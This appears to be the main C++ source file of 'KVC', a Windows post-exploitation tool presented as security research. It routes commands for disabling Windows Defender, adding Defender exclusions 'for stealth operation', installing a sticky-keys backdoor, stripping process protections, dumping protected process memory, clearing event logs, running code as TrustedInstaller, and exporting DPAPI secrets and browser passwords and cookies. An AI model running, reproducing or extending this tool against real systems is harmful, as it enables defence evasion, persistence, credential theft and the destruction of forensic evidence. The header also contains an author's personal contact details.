/*******************************************************************************
  _  ____     ______ 
 | |/ /\ \   / / ___|
 | ' /  \ \ / / |    
 | . \   \ V /| |___ 
 |_|\_\   \_/  \____|

The **Kernel Vulnerability Capabilities (KVC)** framework represents a paradigm shift in Windows security research, 
offering unprecedented access to modern Windows internals through sophisticated ring-0 operations. Originally conceived 
as "Kernel Process Control," the framework has evolved to emphasize not just control, but the complete **exploitation 
of kernel-level primitives** for legitimate security research and penetration testing.

KVC addresses the critical gap left by traditional forensic tools that have become obsolete in the face of modern Windows 
security hardening. Where tools like ProcDump and Process Explorer fail against Protected Process Light (PPL) and Antimalware 
Protected Interface (AMSI) boundaries, KVC succeeds by operating at the kernel level, manipulating the very structures 
that define these protections.

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

*******************************************************************************/

#include "common.h"
#include "Controller.h"
#include "DefenderManager.h"
#include "ProcessManager.h"
#include "ServiceManager.h"
#include "HiveManager.h"
#include "HelpSystem.h"
#include <string_view>
#include <charconv>
#include <signal.h>
#include <unordered_map>
#include <algorithm>
#include <reason.h>

#pragma comment(lib, "user32.lib")

// Forward declaration for console color function
void SetColor(int color);

// Implementation of console color function
void SetColor(int color) 
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

// Forward declarations for utility functions
std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept;
bool IsNumeric(std::wstring_view str) noexcept;
bool IsHelpFlag(std::wstring_view arg) noexcept;
std::optional<TrustedInstallerIntegrator::ExclusionType> ParseExclusionType(std::wstring_view typeStr) noexcept;
void CleanupDriver() noexcept;
bool InitiateSystemRestart() noexcept;

// Global state for signal handling and emergency cleanup
volatile bool g_interrupted = false;
std::unique_ptr<Controller> g_controller = nullptr;

// Signal handler for graceful Ctrl+C cleanup to prevent system instability
void SignalHandler(int signal)
{
    if (signal == SIGINT && !g_interrupted)
    {
        g_interrupted = true;
        std::wcout << L"\n[!] Ctrl+C detected - performing emergency cleanup..." << std::endl;
        
        if (g_controller)
        {
            try
            {
                g_controller->PerformAtomicCleanup();
                std::wcout << L"[+] Emergency cleanup completed successfully" << std::endl;
            }
            catch (...)
            {
                std::wcout << L"[-] Emergency cleanup failed" << std::endl;
            }
        }
        
        ExitProcess(130);
    }
}

// Parse exclusion type string for enhanced Windows Defender management
std::optional<TrustedInstallerIntegrator::ExclusionType> ParseExclusionType(std::wstring_view typeStr) noexcept
{
    static const std::unordered_map<std::wstring, TrustedInstallerIntegrator::ExclusionType> typeMap = {
        {L"paths", TrustedInstallerIntegrator::ExclusionType::Paths},
        {L"processes", TrustedInstallerIntegrator::ExclusionType::Processes},
        {L"extensions", TrustedInstallerIntegrator::ExclusionType::Extensions},
        {L"ipaddresses", TrustedInstallerIntegrator::ExclusionType::IpAddresses}
    };
    
    std::wstring lowerType(typeStr);
    std::transform(lowerType.begin(), lowerType.end(), lowerType.begin(), ::towlower);
    
    auto it = typeMap.find(lowerType);
    return (it != typeMap.end()) ? std::make_optional(it->second) : std::nullopt;
}

// System restart with proper privilege escalation for security engine changes
bool InitiateSystemRestart() noexcept
{
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        ERROR(L"Failed to open process token for restart");
        return false;
    }

    if (!LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &luid)) {
        ERROR(L"Failed to lookup shutdown privilege");
        CloseHandle(token);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool success = AdjustTokenPrivileges(token, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(token);

    if (!success) {
        ERROR(L"Failed to enable shutdown privilege");
        return false;
    }

    // Initiate system restart with appropriate reason code for software changes
    return ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 
                        SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != 0;
}

bool CheckKvcPassExists() noexcept
{
    if (GetFileAttributesW(L"kvc_pass.exe") != INVALID_FILE_ATTRIBUTES) 
        return true;
    
    wchar_t systemDir[MAX_PATH];
    if (GetSystemDirectoryW(systemDir, MAX_PATH) > 0) {
        std::wstring path = std::wstring(systemDir) + L"\\kvc_pass.exe";
        return GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES;
    }
    return false;
}

// Main application entry point with comprehensive command handling
int wmain(int argc, wchar_t* argv[])
{
    // Install signal handler for emergency cleanup on Ctrl+C
    signal(SIGINT, SignalHandler);
    
    // Service mode detection - MUST BE FIRST to handle NT service startup properly
    if (argc >= 2) {
        std::wstring_view firstArg = argv[1];
        if (firstArg == L"--service") {
            return ServiceManager::RunAsService();
        }
    }
    
    // Display comprehensive help if no arguments provided
    if (argc < 2)
    {
        HelpSystem::PrintUsage(argv[0]);
        return 1;
    }

    std::wstring_view firstArg = argv[1];
    
    // Handle various help flag formats
    if (IsHelpFlag(firstArg))
    {
        HelpSystem::PrintUsage(argv[0]);
        return 0;
    }

    // Initialize controller for kernel operations and driver management
    g_controller = std::make_unique<Controller>();
    std::wstring_view command = firstArg;

    try
    {
        // Service management commands for advanced deployment scenarios
        if (command == L"install")
        {
            wchar_t exePath[MAX_PATH];
            if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
                ERROR(L"Failed to get current executable path");
                return 1;
            }
            
            INFO(L"Installing Kernel Vulnerability Capabilities Framework service for advanced scenarios...");
            bool success = ServiceManager::InstallService(exePath);
            return success ? 0 : 1;
        }
        
		else if (command == L"uninstall") 
		{
			INFO(L"Uninstalling Kernel Vulnerability Capabilities Framework service...");
			bool success = ServiceManager::UninstallService();
			
			// Clear the entire configuration from the registry
			INFO(L"Cleaning up registry configuration...");
			HKEY hKey;
			if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
			{
				LONG result = RegDeleteTreeW(hKey, L"kvc");
				if (result == ERROR_SUCCESS) {
					SUCCESS(L"Registry configuration cleaned successfully");
				}
				else if (result == ERROR_FILE_NOT_FOUND) {
					INFO(L"No registry configuration found to clean");
				}
				else {
					ERROR(L"Failed to clean registry configuration: %d", result);
				}
				RegCloseKey(hKey);
			}
			
			return success ? 0 : 1;
		}
        
        else if (command == L"service")
        {
            if (argc < 3) {
                ERROR(L"Missing service command. Usage: service <start|stop|status>");
                return 1;
            }
            
            std::wstring_view serviceCmd = argv[2];
            
            if (serviceCmd == L"start") {
                INFO(L"Starting Kernel Vulnerability Capabilities Framework service...");
                bool success = ServiceManager::StartServiceProcess();
                if (success) {
                    SUCCESS(L"Service started successfully");
                    return 0;
                } else {
                    ERROR(L"Failed to start service");
                    return 1;
                }
            }
            else if (serviceCmd == L"stop") {
                INFO(L"Stopping Kernel Vulnerability Capabilities Framework service...");
                bool success = ServiceManager::StopServiceProcess();
                if (success) {
                    SUCCESS(L"Service stopped successfully");
                    return 0;
                } else {
                    ERROR(L"Failed to stop service");
                    return 1;
                }
            }
            else if (serviceCmd == L"status") {
                // Enhanced service status checking with detailed diagnostic output
                INFO(L"Checking Kernel Vulnerability Capabilities Framework service status...");
                
                const bool installed = IsServiceInstalled();
                const bool running = installed ? IsServiceRunning() : false;
                
                std::wcout << L"\n";
                INFO(L"Service Information:");
                INFO(L"  Name: %s", ServiceManager::SERVICE_NAME);
                INFO(L"  Display Name: %s", ServiceManager::SERVICE_DISPLAY_NAME);
                std::wcout << L"\n";
                
                // Status display with appropriate color coding for visual clarity
                if (installed) {
                    SUCCESS(L"Installation Status: INSTALLED");
                    if (running) {
                        SUCCESS(L"Runtime Status: RUNNING");
                        SUCCESS(L"Service is operational and ready for kernel operations");
                        INFO(L"The service can be controlled via SCM or kvc commands");
                    } else {
                        ERROR(L"Runtime Status: STOPPED");
                        ERROR(L"Service is installed but not currently running");
                        INFO(L"Use 'kvc service start' to start the service");
                    }
                } else {
                    ERROR(L"Installation Status: NOT INSTALLED");
                    ERROR(L"Service is not installed on this system");
                    INFO(L"Use 'kvc install' to install the service first");
                }
                
                std::wcout << L"\n";
                return 0;
            }
            else {
                ERROR(L"Unknown service command: %s", serviceCmd.data());
                return 1;
            }
        }

        // Security Engine Management Commands for bypassing Windows Defender protection
        else if (command == L"secengine")
        {
            if (argc < 3) {
                ERROR(L"Missing subcommand for secengine. Usage: kvc secengine <disable|enable|status>");
                return 1;
            }
            
            std::wstring_view subcommand = argv[2];
            
            if (subcommand == L"disable") {
                if (DefenderManager::DisableSecurityEngine()) {
                    SUCCESS(L"Security engine disabled successfully - restart required");
                    
                    // Optional immediate restart for automated scenarios
                    if (argc > 3 && std::wstring_view(argv[3]) == L"--restart") {
                        INFO(L"Initiating system restart...");
                        return InitiateSystemRestart() ? 0 : 1;
                    }
                    return 0;
                }
                return 1;
            }
            else if (subcommand == L"enable") {
                if (DefenderManager::EnableSecurityEngine()) {
                    SUCCESS(L"Security engine enabled successfully - restart required");
                    
                    // Optional immediate restart for automated scenarios
                    if (argc > 3 && std::wstring_view(argv[3]) == L"--restart") {
                        INFO(L"Initiating system restart...");
                        return InitiateSystemRestart() ? 0 : 1;
                    }
                    return 0;
                }
                return 1;
            }
            else if (subcommand == L"status") {
                auto status = DefenderManager::GetSecurityEngineStatus();
                
                // Display status with color-coded output for immediate visual feedback
                if (status == DefenderManager::SecurityState::ENABLED) {
                    INFO(L"Security Engine Status: ENABLED (Active Protection)");
				HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
				SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
				std::wcout << L"  ✓ Windows Defender is actively protecting the system\n";
				SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
                }
                else if (status == DefenderManager::SecurityState::DISABLED) {
                    INFO(L"Security Engine Status: DISABLED (Inactive Protection)");
                    SetColor(12); // Red
                    std::wcout << L"  ✗ Windows Defender protection is disabled\n";
                    SetColor(7);  // Reset to default
                }
                else {
                    INFO(L"Security Engine Status: UNKNOWN (Cannot determine state)");
                    SetColor(14); // Yellow
                    std::wcout << L"  ? Unable to determine Defender protection state\n";
                    SetColor(7);  // Reset to default
                }
                
                return 0;
            }
            else {
                ERROR(L"Invalid secengine subcommand: %s", subcommand.data());
                ERROR(L"Valid subcommands: disable, enable, status");
                return 1;
            }
        }

        // Sticky keys backdoor management using IFEO technique for persistence
        else if (command == L"shift")
        {
            INFO(L"Installing sticky keys backdoor with Defender bypass...");
            return g_controller->InstallStickyKeysBackdoor() ? 0 : 2;
        }
        
        else if (command == L"unshift") 
        {
            INFO(L"Removing sticky keys backdoor...");
            return g_controller->RemoveStickyKeysBackdoor() ? 0 : 2;
        }

        // Memory dumping operations with automatic privilege escalation
        else if (command == L"dump")
        {
            if (argc < 3)
            {
                ERROR(L"Missing PID/process name argument for dump command");
                return 1;
            }

            std::wstring_view target = argv[2];
            std::wstring outputPath;

            // Use provided output path or default to Downloads folder for convenience
            if (argc >= 4)
                outputPath = argv[3];
            else
            {
                wchar_t* downloadsPath;
                if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &downloadsPath) == S_OK)
                {
                    outputPath = downloadsPath;
                    outputPath += L"\\";
                    CoTaskMemFree(downloadsPath);
                }
                else
                {
                    outputPath = L".\\";
                }
            }

            // Handle numeric PID or process name with intelligent pattern matching
            if (IsNumeric(target))
            {
                auto pid = ParsePid(target);
                if (!pid)
                {
                    ERROR(L"Invalid PID format: %s", target.data());
                    return 1;
                }
                return g_controller->DumpProcess(pid.value(), outputPath) ? 0 : 2;
            }
            else
            {
                std::wstring processName(target);
                return g_controller->DumpProcessByName(processName, outputPath) ? 0 : 2;
            }
        }
		
		// Look for the "kill" command case and replace it with:
			else if (command == L"kill") {
		ProcessManager::HandleKillCommand(argc, argv, g_controller.get());
		return 0;
		}
        
        // Process information commands with color-coded protection status output
		else if (command == L"list")
		{
			// Detect reboot and enforce session limit on first list after boot
            g_controller->m_sessionMgr.DetectAndHandleReboot();
            return g_controller->ListProtectedProcesses() ? 0 : 2;;
		}
        
        else if (command == L"get")
        {
            if (argc < 3)
            {
                ERROR(L"Missing PID/process name argument for protection query");
                return 1;
            }

            std::wstring_view target = argv[2];
            
            if (IsNumeric(target))
            {
                auto pid = ParsePid(target);
                if (!pid)
                {
                    ERROR(L"Invalid PID format: %s", target.data());
                    return 1;
                }
                return g_controller->GetProcessProtection(pid.value()) ? 0 : 2;
            }
            else
            {
                std::wstring processName(target);
                return g_controller->GetProcessProtectionByName(processName) ? 0 : 2;
            }
        }
        
		else if (command == L"info")
		{
			if (argc < 3)
			{
				ERROR(L"Missing PID/process name argument for detailed information");
				return 1;
			}

			std::wstring_view target = argv[2];
			DWORD targetPid = 0;
			
			if (IsNumeric(target))
			{
				auto pid = ParsePid(target);
				if (!pid)
				{
					ERROR(L"Invalid PID format: %s", target.data());
					return 1;
				}
				targetPid = pid.value();
			}
			else
			{
				auto match = g_controller->ResolveNameWithoutDriver(std::wstring(target));
				if (!match) return 2;
				targetPid = match->Pid;
			}
			
			return g_controller->PrintProcessInfo(targetPid) ? 0 : 2;
		}        // Event log clearing with administrative privileges for forensic cleanup
        else if (command == L"evtclear")
        {
            return g_controller->ClearSystemEventLogs() ? 0 : 2;
        }
        
        // Process protection commands with atomic driver operations
		// Process protection commands with atomic driver operations
		else if (command == L"set" || command == L"protect")
		{
			if (argc < 5)
			{
				ERROR(L"Missing arguments: <PID/process_name> <PP|PPL> <SIGNER_TYPE>");
				return 1;
			}

			std::wstring_view target = argv[2];
			std::wstring level = argv[3];
			std::wstring signer = argv[4];

			// Handle comma-separated list of PIDs for batch operations
			std::wstring targetStr(target);
			if (targetStr.find(L',') != std::wstring::npos)
			{
				std::vector<DWORD> pids;
				std::wstring current;
				
				// Parse comma-separated PIDs with whitespace handling
				for (wchar_t ch : targetStr)
				{
					if (ch == L',')
					{
						if (!current.empty())
						{
							if (IsNumeric(current))
							{
								auto pid = ParsePid(current);
								if (pid) pids.push_back(pid.value());
							}
							current.clear();
						}
					}
					else if (ch != L' ' && ch != L'\t')
					{
						current += ch;
					}
				}
				
				// Last token
				if (!current.empty() && IsNumeric(current))
				{
					auto pid = ParsePid(current);
					if (pid) pids.push_back(pid.value());
				}
				
				if (pids.empty())
				{
					ERROR(L"No valid PIDs found in comma-separated list");
					return 1;
				}
				
				// Batch operation
				INFO(L"Batch %s operation: %zu processes", command.data(), pids.size());
				int successCount = 0;
				
				for (DWORD pid : pids)
				{
					bool result = (command == L"set") ?
						g_controller->SetProcessProtection(pid, level, signer) :
						g_controller->ProtectProcess(pid, level, signer);
					
					if (result) successCount++;
				}
				
				INFO(L"Batch %s completed: %d/%zu processes", command.data(), successCount, pids.size());
				return successCount == pids.size() ? 0 : 2;
			}

			// Single target (PID or name)
			bool result = false;
			
			if (IsNumeric(target))
			{
				auto pid = ParsePid(target);
				if (!pid)
				{
					ERROR(L"Invalid PID format: %s", target.data());
					return 1;
				}
				
				// 'set' forces protection regardless of current state, 'protect' only protects unprotected processes
				result = (command == L"set") ?
					g_controller->SetProcessProtection(pid.value(), level, signer) :
					g_controller->ProtectProcess(pid.value(), level, signer);
			}
			else
			{
				std::wstring processName(target);
				
				result = (command == L"set") ?
					g_controller->SetProcessProtectionByName(processName, level, signer) :
					g_controller->ProtectProcessByName(processName, level, signer);
			}

			return result ? 0 : 2;
		}
        
		else if (command == L"unprotect")
		{
			if (argc < 3)
			{
				ERROR(L"Missing PID/process name argument for unprotection");
				return 1;
			}
			std::wstring_view target = argv[2];
			
			// Handle special 'all' keyword for mass unprotection scenarios
			if (target == L"all")
			{
				return g_controller->UnprotectAllProcesses() ? 0 : 2;
			}
			
			// Handle comma-separated list of targets for efficient batch operations
			std::wstring targetStr(target);
			if (targetStr.find(L',') != std::wstring::npos)
			{
				std::vector<std::wstring> targets;
				std::wstring current;
				
				// Parse comma-separated targets with whitespace handling
				for (wchar_t ch : targetStr)
				{
					if (ch == L',')
					{
						if (!current.empty())
						{
							targets.push_back(current);
							current.clear();
						}
					}
					else if (ch != L' ' && ch != L'\t')
					{
						current += ch;
					}
				}
				
				if (!current.empty())
					targets.push_back(current);
				
				return g_controller->UnprotectMultipleProcesses(targets) ? 0 : 2;
			}
			
			// NEW: Check if single target is a signer type for batch unprotection  
			auto signerType = Utils::GetSignerTypeFromString(targetStr);
			if (signerType) {
				return g_controller->UnprotectBySigner(targetStr) ? 0 : 2;
			}
			
			// Handle single target (PID or process name with pattern matching)
			if (IsNumeric(target))
			{
				auto pid = ParsePid(target);
				if (!pid)
				{
					ERROR(L"Invalid PID format: %s", target.data());
					return 1;
				}
				return g_controller->UnprotectProcess(pid.value()) ? 0 : 2;
			}
			else
			{
				std::wstring processName(target);
				return g_controller->UnprotectProcessByName(processName) ? 0 : 2;
			}
		}
        
			// Restore process protection from saved session state
			else if (command == L"restore")
			{
				if (argc < 3)
				{
					ERROR(L"Missing argument: <signer_name|all>");
					return 1;
				}
				
				std::wstring_view target = argv[2];
				
				if (target == L"all")
				{
					return g_controller->RestoreAllProtection() ? 0 : 2;
				}
				else
				{
					std::wstring signerName(target);
					return g_controller->RestoreProtectionBySigner(signerName) ? 0 : 2;
				}
			}

			// Display session history
			else if (command == L"history")
			{
				g_controller->ShowSessionHistory();
				return 0;
			}
		
			// Cleanup all sessions except current
			else if (command == L"cleanup-sessions")
			{
				g_controller->m_sessionMgr.CleanupAllSessionsExceptCurrent();
				return 0;
			}
			
			else if (command == L"list-signer") {
			if (argc < 3) {
				ERROR(L"Missing signer type argument");
				return 1;
			}
			
			std::wstring signerName = argv[2];
			return g_controller->ListProcessesBySigner(signerName) ? 0 : 1;
		}
		
		
        // System integration commands with TrustedInstaller privileges for maximum access
        else if (command == L"trusted")
        {
            if (argc < 3)
            {
                ERROR(L"Missing command argument for elevated execution");
                return 1;
            }

            // Combine all remaining arguments into full command with proper argument handling
            std::wstring fullCommand;
            for (int i = 2; i < argc; i++)
            {
                if (i > 2) fullCommand += L" ";
                fullCommand += argv[i];
            }

            return g_controller->RunAsTrustedInstaller(fullCommand) ? 0 : 2;
        }
        
        else if (command == L"install-context")
        {
            return g_controller->AddContextMenuEntries() ? 0 : 1;
        }

        // Enhanced Windows Defender exclusion management with type specification
        else if (command == L"add-exclusion")
        {
            // Legacy syntax: kvc add-exclusion (no args) - add self to exclusions for stealth operation
            if (argc < 3) {
                wchar_t exePath[MAX_PATH];
                if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
                    ERROR(L"Failed to get current executable path");
                    return 1;
                }
                
                INFO(L"Automatically adding self to Defender exclusions: %s", exePath);
                return g_controller->AddToDefenderExclusions(exePath) ? 0 : 1;
            }
            
            // New syntax with type specification: kvc add-exclusion Processes malware.exe
            if (argc >= 4) {
                std::wstring_view typeStr = argv[2];
                std::wstring value = argv[3];
                
                auto exclusionType = ParseExclusionType(typeStr);
                if (!exclusionType) {
                    ERROR(L"Invalid exclusion type: %s. Valid types: Paths, Processes, Extensions, IpAddresses", typeStr.data());
                    return 1;
                }
                
                return g_controller->AddDefenderExclusion(exclusionType.value(), value) ? 0 : 1;
            }
            // Legacy syntax for backward compatibility: kvc add-exclusion C:\file.exe
            else {
                std::wstring filePath = argv[2];
                return g_controller->AddToDefenderExclusions(filePath) ? 0 : 1;
            }
        }

        else if (command == L"remove-exclusion")
        {
            // Legacy syntax: kvc remove-exclusion (no args) - remove self from exclusions
            if (argc < 3) {
                wchar_t exePath[MAX_PATH];
                if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
                    ERROR(L"Failed to get current executable path");
                    return 1;
                }
                
                INFO(L"Automatically removing self from Defender exclusions: %s", exePath);
                return g_controller->RemoveFromDefenderExclusions(exePath) ? 0 : 1;
            }
            
            // New syntax with type specification: kvc remove-exclusion Processes malware.exe
            if (argc >= 4) {
                std::wstring_view typeStr = argv[2];
                std::wstring value = argv[3];
                
                auto exclusionType = ParseExclusionType(typeStr);
                if (!exclusionType) {
                    ERROR(L"Invalid exclusion type: %s. Valid types: Paths, Processes, Extensions, IpAddresses", typeStr.data());
                    return 1;
                }
                
                return g_controller->RemoveDefenderExclusion(exclusionType.value(), value) ? 0 : 1;
            }
            // Legacy syntax for backward compatibility: kvc remove-exclusion C:\file.exe
            else {
                std::wstring filePath = argv[2];
                return g_controller->RemoveFromDefenderExclusions(filePath) ? 0 : 1;
            }
        }

        // DPAPI secrets extraction commands with comprehensive browser support
        else if (command == L"export")
        {
            if (argc < 3)
            {
                ERROR(L"Missing subcommand for export. Usage: export secrets [output_path]");
                return 1;
            }

            std::wstring_view subCommand = argv[2];
            
            if (subCommand == L"secrets")
            {
                std::wstring outputPath;
                
                // Use provided output path or default to Downloads folder for user convenience
                if (argc >= 4)
                {
                    outputPath = argv[3];
                }
                else
                {
                    wchar_t* downloadsPath;
                    if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &downloadsPath) == S_OK)
                    {
                        outputPath = downloadsPath;
                        CoTaskMemFree(downloadsPath);
                    }
                    else
                    {
                        outputPath = L".\\";
                    }
                }
                
                INFO(L"Exporting secrets using TrustedInstaller privileges...");
                return g_controller->ShowPasswords(outputPath) ? 0 : 2;
            }
            else
            {
                ERROR(L"Unknown export subcommand: %s. Available: secrets", subCommand.data());
                return 1;
            }
        }

        // Browser passwords extraction with kvc_pass integration for modern browsers
		else if (command == L"browser-passwords" || command == L"bp")
		{
			std::wstring browserType = L"chrome"; // Default to Chrome for compatibility
			std::wstring outputPath = L".";       // Current directory as fallback
			
			// Parse command line arguments for browser type and output path
			for (int i = 2; i < argc; i++) {
				std::wstring arg = argv[i];
				if (arg == L"--chrome") {
					browserType = L"chrome";
				} else if (arg == L"--brave") {
					browserType = L"brave";
				} else if (arg == L"--edge") {
					browserType = L"edge";
				} else if (arg == L"--all") {
					browserType = L"all";
				} else if (arg == L"--output" || arg == L"-o") {
					if (i + 1 < argc) {
						outputPath = argv[++i];
					} else {
						ERROR(L"Missing path for --output argument");
						return 1;
					}
				} else {
					ERROR(L"Unknown argument: %s", arg.c_str());
					return 1;
				}
			}
			
			// Handle 'all' - requires kvc_pass.exe
			if (browserType == L"all") {
				if (!CheckKvcPassExists()) {
					ERROR(L"--all requires kvc_pass.exe in current directory or System32");
					ERROR(L"For Edge-only extraction without kvc_pass, use: kvc bp --edge");
					return 1;
				}
				
				if (!g_controller->ExportBrowserData(outputPath, browserType)) {
					ERROR(L"Failed to extract from all browsers");
					return 1;
				}
				return 0;
			}
			
			// Handle Edge with dual extraction strategy
			if (browserType == L"edge") {
				bool hasKvcPass = CheckKvcPassExists();
				
				if (hasKvcPass) {
					// Full extraction: kvc_pass (JSON + cookies) + KVC DPAPI (HTML/TXT)
					INFO(L"Full Edge extraction: JSON + cookies (kvc_pass) + HTML/TXT reports (KVC DPAPI)");
					
					// Run kvc_pass for JSON output and cookies/logins
					if (!g_controller->ExportBrowserData(outputPath, browserType)) {
						ERROR(L"kvc_pass extraction failed, continuing with built-in DPAPI");
					}
					
					// Run built-in DPAPI for HTML/TXT reports (no format collision)
					INFO(L"Generating HTML/TXT password reports...");
					g_controller->ShowPasswords(outputPath);
					
					SUCCESS(L"Edge extraction complete: all formats generated");
				} else {
					// Fallback: built-in DPAPI only (legacy standalone mode)
					INFO(L"kvc_pass.exe not found - using built-in Edge DPAPI extraction");
					INFO(L"Output: HTML/TXT reports only. For JSON/cookies, add kvc_pass.exe");
					g_controller->ShowPasswords(outputPath);
				}
				return 0;
			}
			
			// Chrome, Brave - require kvc_pass.exe
			if (!g_controller->ExportBrowserData(outputPath, browserType)) {
				ERROR(L"Failed to export browser passwords");
				return 1;
			}
			return 0;
		}
        
        // Combined binary processing - decrypt and deploy kvc.dat components for advanced scenarios
        else if (command == L"setup")
        {
            INFO(L"Loading and processing kvc.dat combined binary...");
            return g_controller->LoadAndSplitCombinedBinaries() ? 0 : 2;
        }
		
		// Registry backup and defragmentation operations
		else if (command == L"registry")
		{
			if (argc < 3)
			{
				ERROR(L"Missing registry subcommand: backup, restore, or defrag");
				return 1;
			}
			
			std::wstring_view subcommand = argv[2];
			HiveManager hiveManager;
			
			if (subcommand == L"backup")
			{
				std::wstring targetPath;
				if (argc >= 4)
					targetPath = argv[3];
				
				return hiveManager.Backup(targetPath) ? 0 : 2;
			}
			else if (subcommand == L"restore")
			{
				if (argc < 4)
				{
					ERROR(L"Missing source path for restore operation");
					return 1;
				}
				
				std::wstring sourcePath = argv[3];
				return hiveManager.Restore(sourcePath) ? 0 : 2;
			}
			else if (subcommand == L"defrag")
			{
				std::wstring tempPath;
				if (argc >= 4)
					tempPath = argv[3];
				
				return hiveManager.Defrag(tempPath) ? 0 : 2;
			}
			else
			{
				ERROR(L"Unknown registry subcommand: %s", subcommand.data());
				return 1;
			}
		}
		
		else
		{
			HelpSystem::PrintUnknownCommandMessage(command);
			return 1;
		}
    }
    catch (const std::exception& e)
    {
        std::string msg = e.what();
        std::wstring wmsg(msg.begin(), msg.end());
        ERROR(L"Exception occurred during execution: %s", wmsg.c_str());
        CleanupDriver();
        return 3;
    }
    catch (...)
    {
        ERROR(L"Unknown exception occurred during execution");
        CleanupDriver();
        return 3;
    }

    CleanupDriver();
    return 0;
}

// Emergency cleanup for driver resources to prevent system instability
void CleanupDriver() noexcept
{
    if (g_controller)
    {
        g_controller->PerformAtomicCleanup();
    }
}

// Robust PID parsing with comprehensive validation
std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept
{
    if (pidStr.empty()) return std::nullopt;

    // Convert wide string to narrow for std::from_chars compatibility
    std::string narrowStr;
    narrowStr.reserve(pidStr.size());
    
    for (wchar_t wc : pidStr)
    {
        if (wc > 127) return std::nullopt; // Non-ASCII character detected
        narrowStr.push_back(static_cast<char>(wc));
    }

    DWORD result = 0;
    auto [ptr, ec] = std::from_chars(narrowStr.data(), 
                                     narrowStr.data() + narrowStr.size(), 
                                     result);
    
    return (ec == std::errc{} && ptr == narrowStr.data() + narrowStr.size()) ? 
           std::make_optional(result) : std::nullopt;
}

// Check if string contains only digits for PID validation
bool IsNumeric(std::wstring_view str) noexcept
{
    if (str.empty()) return false;
    
    for (wchar_t ch : str)
    {
        if (ch < L'0' || ch > L'9')
            return false;
    }
    
    return true;
}

// Recognize various help flag formats for user convenience
bool IsHelpFlag(std::wstring_view arg) noexcept
{
    if (arg == L"/?" || arg == L"/help" || arg == L"/h")
        return true;
    
    if (arg == L"-?" || arg == L"-help" || arg == L"-h")
        return true;
    
    if (arg == L"--help" || arg == L"--h")
        return true;
    
    if (arg == L"help" || arg == L"?")
        return true;
    
    return false;
}